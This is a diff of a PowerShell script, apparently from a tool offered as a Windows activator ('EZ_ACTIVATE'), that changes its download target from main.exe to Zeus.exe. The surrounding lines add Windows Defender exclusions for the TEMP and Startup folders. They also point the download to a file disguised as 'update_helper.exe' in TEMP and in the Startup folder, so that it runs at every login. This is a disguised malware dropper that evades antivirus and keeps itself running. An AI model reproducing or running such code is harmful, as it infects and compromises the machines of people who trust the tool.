@@ -15,7 +15,7 @@ Get-WmiObject -Class Win32_Service -Filter "Name='WdNisSvc'" | ForEach-Object { 
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows Defender\Exclusions\Paths" /v "$env:TEMP" /t REG_DWORD /d "0" /f 2>$null
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows Defender\Exclusions\Paths" /v "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" /t REG_DWORD /d "0" /f 2>$null
 
-$url = "https://github.com/QUADROisCoding/EZ_ACTIVATE/raw/refs/heads/main/main.exe"
+$url = "https://github.com/QUADROisCoding/EZ_ACTIVATE/raw/refs/heads/main/Zeus.exe"
 $tempFile = "$env:TEMP\update_helper.exe"
 $startupFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update_helper.exe"
 
